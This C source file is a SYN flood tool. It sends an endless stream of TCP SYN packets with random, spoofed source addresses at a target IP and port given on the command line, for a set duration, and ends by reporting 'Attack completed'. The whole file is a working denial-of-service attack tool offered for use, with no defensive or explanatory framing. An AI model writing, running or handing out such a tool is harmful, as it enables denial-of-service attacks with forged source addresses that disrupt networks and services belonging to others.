#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

// Checksum calculation
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    
    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("TCP-SYN Flood - SYN Packet Flood\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    // Raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        perror("socket");
        return 1;
    }
    
    int one = 1;
    const int *val = &one;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }
    
    printf("[TCP-SYN] Starting SYN Flood on %s:%d\n", target_ip, target_port);
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    time_t start = time(NULL);
    unsigned long packets = 0;
    
    while(time(NULL) - start < duration) {
        memset(packet, 0, 4096);
        
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = rand(); // Spoof source IP
        iph->daddr = sin.sin_addr.s_addr;
        
        // TCP Header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1; // SYN flag
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Send packet
        sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
        packets++;
        
        if(packets % 10000 == 0) {
            printf("[TCP-SYN] Sent %lu packets\n", packets);
        }
    }
    
    close(sock);
    printf("[TCP-SYN] Attack completed - %lu packets sent\n", packets);
    return 0;
}
